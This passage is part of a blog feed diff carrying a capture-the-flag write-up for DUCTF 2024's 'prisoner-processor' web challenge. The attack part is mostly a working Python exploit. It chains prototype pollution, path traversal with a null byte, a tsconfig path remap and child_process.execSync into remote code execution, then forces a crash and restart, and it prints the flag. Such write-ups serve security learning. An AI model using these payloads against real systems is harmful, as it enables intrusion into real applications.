+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">signed.release:</span> <span style="color:#ae81ff">2054-03-02</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">45</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">01</span><span style="color:#960050;background-color:#1e0010">Z</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">signed.__proto__:</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">outputPrefix:</span> <span style="color:#e6db74">&#34;../../../../proc/self/cwd/tsconfig.json\0&#34;</span>
+</span></span></code></pre></div><p>We can finally combine all of this into the final solve.</p>
+<h2 id="solve">SOLVE</h2>
+<ol>
+<li>Copy an example prisoner JSON file and add your tsconfig path re-mapping:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#e6db74">&#34;//&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">&#34;\n{\&#34;compilerOptions\&#34;:{\&#34;paths\&#34;:{\&#34;yaml\&#34;:[\&#34;./examples/julia.js\&#34;]}}}&#34;</span><span style="color:#960050;background-color:#1e0010">,</span>
+</span></span></code></pre></div><p>Which will be valid <code>tsconfig.json</code>. We put our js file into the examples folder simply cause it&rsquo;s an rwx folder. Then add:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.__proto__&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;outputPrefix&#34;</span>:<span style="color:#960050;background-color:#1e0010">&#34;../../../../proc/self/cwd/tsconfig.json\u</span><span style="color:#ae81ff">0000</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>The nullbyte to remove the <code>&lt;randomcharacters&gt;.yaml</code> filename, the directory traversal and <code>proc/self/cwd</code> to get the symlink to <code>/app</code> and bypass the BANNED_WORDS list.</p>
+<ol start="2">
+<li>
+<p>Make a javascript file and yeet into <code>/examples</code> for RCE (exec getflag and whatever)</p>
+</li>
+<li>
+<p>Crash the app (we did this by trying to write to <code>proc/self/mem</code>) to force a restart and have our overwritten <code>tsconfig.json</code> apply to the app</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>REMOTE <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> REMOTE:
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://web-prisoner-processor-c8d94eb745951d8e.2024.ductf.dev&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost:1337&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0. get signature</span>
+</span></span><span style="display:flex;"><span>sig <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/examples&#34;</span>)<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;examples&#34;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;signature&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1. overwrite tsconfig.json</span>
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>post(host<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/convert-to-yaml&#34;</span>, json<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;//&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">compilerOptions</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:{</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">paths</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:{</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">yaml</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:[</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">./examples/julia.js</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]}}}&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.name&#34;</span>:<span style="color:#e6db74">&#34;jeff&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.animalType&#34;</span>:<span style="color:#e6db74">&#34;emu&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.age&#34;</span>:<span style="color:#ae81ff">12</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.crime&#34;</span>:<span style="color:#e6db74">&#34;assault&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.description&#34;</span>:<span style="color:#e6db74">&#34;clotheslined someone with their neck&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.start&#34;</span>:<span style="color:#e6db74">&#34;2024-03-02T10:45:01Z&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.release&#34;</span>:<span style="color:#e6db74">&#34;2054-03-02T10:45:01Z&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Object.entries ignores this but for ... in won&#39;t</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.__proto__&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;outputPrefix&#34;</span>:<span style="color:#e6db74">&#34;../../../../proc/self/cwd/tsconfig.json</span><span style="color:#ae81ff">\u0000</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#nullbyte to make our own files</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;signature&#34;</span>: sig
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. write rce to examples/julia.js</span>
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>post(host<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/convert-to-yaml&#34;</span>, json<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;//&#34;</span>: <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">var dog = &#39;sed -i &#34;s/signed/$(/bin/getflag)/g&#34; /app/examples/jeff.json&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">require(&#34;child_process&#34;).execSync(dog);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">exports.stringify = function(dawg) {return dawg;}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/*&#34;&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.name&#34;</span>:<span style="color:#e6db74">&#34;jeff&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.animalType&#34;</span>:<span style="color:#e6db74">&#34;emu&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.age&#34;</span>:<span style="color:#ae81ff">12</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.crime&#34;</span>:<span style="color:#e6db74">&#34;assault&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.description&#34;</span>:<span style="color:#e6db74">&#34;clotheslined someone with their neck&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.start&#34;</span>:<span style="color:#e6db74">&#34;2024-03-02T10:45:01Z&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.release&#34;</span>:<span style="color:#e6db74">&#34;2054-03-02T10:45:01Z&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signed.__proto__&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;outputPrefix&#34;</span>:<span style="color:#e6db74">&#34;../../../../proc/self/cwd/examples/julia.js</span><span style="color:#ae81ff">\u0000</span><span style="color:#e6db74"> */ //&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;signature&#34;</span>: sig
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. crash</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(host<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/convert-to-yaml&#34;</span>, json<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;signed.name&#34;</span>:<span style="color:#e6db74">&#34;jeff&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;signed.animalType&#34;</span>:<span style="color:#e6db74">&#34;emu&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;signed.age&#34;</span>:<span style="color:#ae81ff">12</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;signed.crime&#34;</span>:<span style="color:#e6db74">&#34;assault&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;signed.description&#34;</span>:<span style="color:#e6db74">&#34;clotheslined someone with their neck&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;signed.start&#34;</span>:<span style="color:#e6db74">&#34;2024-03-02T10:45:01Z&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;signed.release&#34;</span>:<span style="color:#e6db74">&#34;2054-03-02T10:45:01Z&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;signed.__proto__&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;outputPrefix&#34;</span>:<span style="color:#e6db74">&#34;../../../../proc/self/mem&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;signature&#34;</span>: sig
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>ConnectionError:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. get flag (assuming server takes &lt;5 seconds to come back up)</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;waiting...&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>, list(requests<span style="color:#f92672">.</span>get(host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/examples&#34;</span>)<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;examples&#34;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;data&#34;</span>]<span style="color:#f92672">.</span>keys())[<span style="color:#ae81ff">0</span>][:<span style="color:#f92672">-</span>len(<span style="color:#e6db74">&#34;.name&#34;</span>)])
+</span></span></code></pre></div><p><code>flag: DUCTF{bUnBuNbUNbVN_hOn0_tH15_aPp_i5_d0n3!!!one1!!!!}</code></p>
+]]></content>
+        </item>
         
         <item>
             <title>A case for documentation</title>
